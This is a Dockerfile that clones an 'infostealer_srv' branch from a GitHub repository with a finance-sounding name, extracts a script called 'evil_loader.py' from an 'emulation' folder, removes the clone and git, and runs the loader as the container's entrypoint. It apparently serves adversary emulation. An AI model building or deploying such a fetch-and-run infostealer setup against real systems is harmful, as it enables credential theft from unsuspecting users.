# ./Dockerfile
FROM python:3.12.2-slim

ARG BRANCH=infostealer_srv
WORKDIR /opt


RUN apt-get update \
 && apt-get install -y --no-install-recommends git \
 && pip install --no-cache-dir --upgrade pip requests

RUN git clone --depth 1 --branch $BRANCH \
      https://github.com/phantombyte-security/montecarlo-portfolio-management.git repo \
 && cp repo/emulation/evil_loader.py /opt/evil_loader.py \
 && rm -rf repo

RUN apt-get purge -y git \
 && apt-get autoremove -y \
 && rm -rf /var/lib/apt/lists/*

ENTRYPOINT ["python", "/opt/evil_loader.py"]
